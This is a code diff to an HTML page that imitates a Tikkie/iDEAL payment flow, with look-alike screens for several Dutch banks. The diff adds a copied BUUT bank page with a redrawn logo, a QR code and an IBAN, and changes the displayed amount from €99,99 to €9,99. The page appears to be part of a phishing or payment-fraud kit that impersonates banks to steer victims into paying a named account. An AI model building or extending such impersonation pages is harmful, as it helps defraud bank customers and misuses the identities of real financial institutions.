@@ -1659,6 +1659,209 @@
     #page-bunq .bunq-cancel-btn:active {
       transform: scale(0.97);
     }
+
+    /* ========== BUUT PAGE ========== */
+    #page-buut {
+      background-color: #16162a;
+      color: #ffffff;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 56px 20px 40px;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+    #page-buut .buut-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 52px;
+      user-select: none;
+    }
+    #page-buut .buut-logo svg {
+      height: 56px;
+      width: auto;
+    }
+    #page-buut .buut-payment-card {
+      background-color: #25253d;
+      border-radius: 20px;
+      width: 100%;
+      max-width: 340px;
+      padding: 24px 28px 28px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+    #page-buut .buut-card-header {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      margin-bottom: 28px;
+      position: relative;
+      min-height: 28px;
+    }
+    #page-buut .buut-card-title {
+      font-size: 17px;
+      font-weight: 500;
+      color: #ffffff;
+      letter-spacing: 0.15px;
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      white-space: nowrap;
+    }
+    #page-buut .buut-close-btn {
+      width: 30px;
+      height: 30px;
+      background: transparent;
+      border: none;
+      color: #9a9aaa;
+      font-size: 24px;
+      line-height: 1;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: background 0.15s, color 0.15s;
+      padding: 0;
+      z-index: 2;
+      font-family: inherit;
+    }
+    #page-buut .buut-close-btn:hover {
+      background: rgba(255, 255, 255, 0.1);
+      color: #ffffff;
+    }
+    #page-buut .buut-amount {
+      font-size: 42px;
+      font-weight: 600;
+      color: #ffffff;
+      margin-bottom: 8px;
+      letter-spacing: -1px;
+      line-height: 1.05;
+    }
+    #page-buut .buut-merchant-name {
+      font-size: 15px;
+      color: #c4c4d4;
+      margin-bottom: 2px;
+      font-weight: 400;
+    }
+    #page-buut .buut-merchant-type {
+      font-size: 13px;
+      color: #9494a4;
+      margin-bottom: 14px;
+      font-weight: 400;
+    }
+    #page-buut .buut-account-number {
+      font-size: 13px;
+      color: #9494a4;
+      margin-bottom: 28px;
+      letter-spacing: 0.5px;
+      font-variant-numeric: tabular-nums;
+    }
+    #page-buut .buut-qr-container {
+      background: #ffffff;
+      padding: 12px;
+      border-radius: 10px;
+      margin-bottom: 28px;
+      line-height: 0;
+      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.28);
+    }
+    #page-buut .buut-qr-code {
+      width: 200px;
+      height: 200px;
+      display: block;
+      border-radius: 3px;
+    }
+    #page-buut .buut-instructions {
+      font-size: 13.5px;
+      color: #a4a4b4;
+      line-height: 1.55;
+      text-align: left;
+      width: 100%;
+      padding: 0 6px;
+      margin-bottom: 24px;
+    }
+    #page-buut .buut-instructions ol {
+      padding-left: 18px;
+      margin: 0;
+    }
+    #page-buut .buut-instructions li {
+      margin-bottom: 3px;
+    }
+    #page-buut .buut-cancel-btn {
+      width: 100%;
+      padding: 14px 20px;
+      background: transparent;
+      border: 1.5px solid #5a5a70;
+      border-radius: 12px;
+      color: #c8c8d8;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s, border-color 0.15s, color 0.15s;
+      font-family: inherit;
+    }
+    #page-buut .buut-cancel-btn:hover {
+      background: rgba(255, 255, 255, 0.06);
+      border-color: #7a7a90;
+      color: #ffffff;
+    }
+    #page-buut .buut-cancel-btn:active {
+      background: rgba(255, 255, 255, 0.1);
+    }
+    #page-buut .buut-bottom-right {
+      position: fixed;
+      bottom: 22px;
+      right: 22px;
+      display: flex;
+      gap: 8px;
+      z-index: 10;
+    }
+    #page-buut .buut-icon-btn {
+      width: 40px;
+      height: 40px;
+      background: #2c2c40;
+      border: 1px solid #404058;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #b0b0c0;
+      cursor: default;
+      transition: background 0.15s;
+    }
+    #page-buut .buut-icon-btn:hover {
+      background: #363650;
+    }
+    #page-buut .buut-icon-btn svg {
+      width: 18px;
+      height: 18px;
+    }
+    @media (max-width: 420px) {
+      #page-buut {
+        padding: 40px 14px 30px;
+      }
+      #page-buut .buut-logo {
+        margin-bottom: 40px;
+      }
+      #page-buut .buut-logo svg {
+        height: 48px;
+      }
+      #page-buut .buut-payment-card {
+        max-width: 100%;
+        padding: 22px 18px 24px;
+      }
+      #page-buut .buut-amount {
+        font-size: 38px;
+      }
+      #page-buut .buut-qr-code {
+        width: 180px;
+        height: 180px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -1678,7 +1881,7 @@
               <svg viewBox="0 0 12 12"><path d="M4.5 8.5L2 6l1-1 1.5 1.5L9 2l1 1-5.5 5.5z"/></svg>
             </span>
           </div>
-          <div class="amount"><span class="euro">€</span> 99,99</div>
+          <div class="amount"><span class="euro">€</span> 9,99</div>
           <button type="button" class="add-message" id="btn-add-message">
             <span class="plus">+</span> Berichtje toevoegen?
           </button>
@@ -1788,7 +1991,7 @@
       <img src="ideal-wero-logo.png" alt="iDEAL | wero" class="ideal-topbar-logo">
       <div class="ideal-topbar-info">
         <div class="name">Peter van Eggele via Tikkie</div>
-        <div class="amt">€99,99</div>
+        <div class="amt">€9,99</div>
       </div>
     </div>
     <div class="ideal-cancel-row">
@@ -1836,7 +2039,7 @@
       </div>
       <div class="bank-header-info">
         <div class="name" data-i18n="header-name">Peter van Eggele via Tikkie</div>
-        <div class="amount">€99,99</div>
+        <div class="amount">€9,99</div>
       </div>
     </header>
     <button type="button" class="bank-back" id="btn-terug-bank" data-i18n="back">Terug</button>
@@ -1876,7 +2079,7 @@
           <img src="bunq.png" alt="bunq">
           bunq
         </button>
-        <button class="bank-btn" type="button">
+        <button class="bank-btn bank-buut" type="button" id="btn-buut">
           <img src="buut.png" alt="BUUT">
           BUUT
         </button>
@@ -2003,14 +2206,14 @@
       <h2 class="asn-section-title">Betaalgegevens</h2>
 
       <div class="asn-payment-details" id="asn-toggle-details">
-        <span>Verzend de iDEAL | Wero-betaling van € 99,99 naar Peter van Eggele via Tikkie</span>
+        <span>Verzend de iDEAL | Wero-betaling van € 9,99 naar Peter van Eggele via Tikkie</span>
         <span class="arrow">▼</span>
       </div>
 
       <div class="asn-details-content" id="asn-details-content">
         <div class="asn-details-row">
           <span class="label">Bedrag</span>
-          <span class="value">€ 99,99</span>
+          <span class="value">€ 9,99</span>
         </div>
         <div class="asn-details-row">
           <span class="label">Ontvanger</span>
@@ -2076,7 +2279,7 @@
             <img src="phone-coin.svg" alt="" style="width:110px;height:auto;display:block;">
           </div>
           <div class="nn-amount-label">Bedrag</div>
-          <div class="nn-amount">€ 99,99</div>
+          <div class="nn-amount">€ 9,99</div>
           <div class="nn-to-label">Overboeken naar</div>
           <div class="nn-to-value">Peter van Eggele via Tikkie</div>
           <button type="button" class="nn-back-link" id="btn-terug-nn" onclick="goToBank()">
@@ -2104,7 +2307,7 @@
       </div>
       <div class="bunq-title">Peter van Eggele via Tikkie</div>
       <div class="bunq-subtitle">Verkoop</div>
-      <div class="bunq-amount">€ 99,99</div>
+      <div class="bunq-amount">€ 9,99</div>
       <div class="bunq-qr-wrapper">
         <img src="qr-bunq.png" alt="QR Code">
       </div>
@@ -2120,6 +2323,55 @@
       <div class="bunq-bottom-links">
         <a href="#" class="bunq-how-it-works">Kijk hoe het werkt</a>
         <button type="button" class="bunq-cancel-btn" id="btn-annuleer-bunq">Annuleren</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== BUUT PAGE ========== -->
+  <div id="page-buut" class="page">
+    <div class="buut-logo">
+      <svg viewBox="0 0 170 56" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="BUUT">
+        <circle cx="28" cy="28" r="25" stroke="#7B6CFF" stroke-width="3.8" fill="none"/>
+        <path d="M15 44 L7 53 L22 46.5" stroke="#7B6CFF" stroke-width="3.8" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+        <text x="62" y="38"
+              font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif"
+              font-size="34"
+              font-weight="700"
+              fill="#FFFFFF"
+              letter-spacing="-0.6">BUUT</text>
+      </svg>
+    </div>
+    <div class="buut-payment-card">
+      <div class="buut-card-header">
+        <div class="buut-card-title">Betalen met iDEAL</div>
+        <button type="button" class="buut-close-btn" id="btn-close-buut" title="Sluiten" aria-label="Sluiten">×</button>
+      </div>
+      <div class="buut-amount">€ 9,99</div>
+      <div class="buut-merchant-name">peter van eggele</div>
+      <div class="buut-merchant-type">verkoop</div>
+      <div class="buut-account-number">NL16 ABNA 0236 1423 55</div>
+      <div class="buut-qr-container">
+        <img class="buut-qr-code" src="ideal.png" alt="iDEAL QR-code" width="200" height="200">
+      </div>
+      <div class="buut-instructions">
+        <ol>
+          <li>Open de BUUT app</li>
+          <li>Gebruik de QR code scanner<br>om met iDEAL te betalen</li>
+        </ol>
+      </div>
+      <button type="button" class="buut-cancel-btn" id="btn-annuleer-buut">Annuleren</button>
+    </div>
+    <div class="buut-bottom-right">
+      <div class="buut-icon-btn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round">
+          <path d="M12 3v2.5M12 18.5V21M3 12h2.5M18.5 12H21M5.6 5.6l1.8 1.8M16.6 16.6l1.8 1.8M5.6 18.4l1.8-1.8M16.6 7.4l1.8-1.8"/>
+          <circle cx="12" cy="12" r="3.2"/>
+        </svg>
+      </div>
+      <div class="buut-icon-btn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/>
+        </svg>
       </div>
     </div>
   </div>
@@ -2275,10 +2527,11 @@
     const pageAdyen = document.getElementById('page-adyen');
     const pageAsn = document.getElementById('page-asn');
     const pageBunq = document.getElementById('page-bunq');
+    const pageBuut = document.getElementById('page-buut');
 
     function showPage(page) {
       if (!page) return;
-      [pageTikkie, pageIdeal, pageBank, pageAbn, pageNn, pageAdyen, pageAsn, pageBunq].forEach(p => p.classList.remove('active'));
+      [pageTikkie, pageIdeal, pageBank, pageAbn, pageNn, pageAdyen, pageAsn, pageBunq, pageBuut].forEach(p => p.classList.remove('active'));
       page.classList.add('active');
       window.scrollTo(0, 0);
     }
@@ -2377,7 +2630,21 @@
       document.querySelector('meta[name="theme-color"]').setAttribute('content', pageBank.classList.contains('dark') ? '#1a1a1a' : '#ffffff');
     });
 
-    document.querySelectorAll('#page-bank .bank-btn:not(.bank-abn):not(.bank-nn):not(.bank-adyen):not(.bank-asn):not(.bank-bunq)').forEach(btn => {
+    document.querySelectorAll('.bank-buut').forEach(btn => {
+      btn.addEventListener('click', () => {
+        showPage(pageBuut);
+        document.querySelector('meta[name="theme-color"]').setAttribute('content', '#16162a');
+      });
+    });
+
+    function goBackFromBuut() {
+      showPage(pageBank);
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', pageBank.classList.contains('dark') ? '#1a1a1a' : '#ffffff');
+    }
+    document.getElementById('btn-annuleer-buut').addEventListener('click', goBackFromBuut);
+    document.getElementById('btn-close-buut').addEventListener('click', goBackFromBuut);
+
+    document.querySelectorAll('#page-bank .bank-btn:not(.bank-abn):not(.bank-nn):not(.bank-adyen):not(.bank-asn):not(.bank-bunq):not(.bank-buut)').forEach(btn => {
       btn.addEventListener('click', () => console.log('Geselecteerd:', btn.textContent.trim()));
     });
 
@@ -2412,10 +2679,10 @@
     function openAdyenModal(provider) {
       if (provider === 'snelstart') {
         adyenModalTitle.textContent = 'Snelstart – Scan QR-code';
-        adyenModalText.textContent = 'Open de Snelstart-app en scan de QR-code om de betaling van € 99,99 te voltooien.';
+        adyenModalText.textContent = 'Open de Snelstart-app en scan de QR-code om de betaling van € 9,99 te voltooien.';
       } else {
         adyenModalTitle.textContent = 'Moneybird – Scan QR-code';
-        adyenModalText.textContent = 'Open de Moneybird-app en scan de QR-code om de betaling van € 99,99 te voltooien.';
+        adyenModalText.textContent = 'Open de Moneybird-app en scan de QR-code om de betaling van € 9,99 te voltooien.';
       }
       adyenModal.classList.add('visible');
     }
